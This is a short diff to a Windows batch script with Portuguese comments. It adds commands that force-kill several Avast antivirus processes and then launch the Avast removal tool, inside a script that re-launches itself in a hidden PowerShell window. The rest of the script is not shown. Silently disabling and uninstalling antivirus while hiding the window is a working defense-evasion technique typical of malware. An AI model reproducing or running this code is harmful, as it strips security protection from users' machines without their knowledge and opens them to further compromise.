@@ -1,4 +1,14 @@
 @echo off
+taskkill /f /im avastui.exe
+taskkill /f /im avastsvc.exe
+taskkill /f /im aswidsagent.exe
+taskkill /f /im avastbrowser.exe
+
+timeout /t 2 >nul
+
+start AvastClear.exe
+
+
 :: Reexecuta o próprio script oculto
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
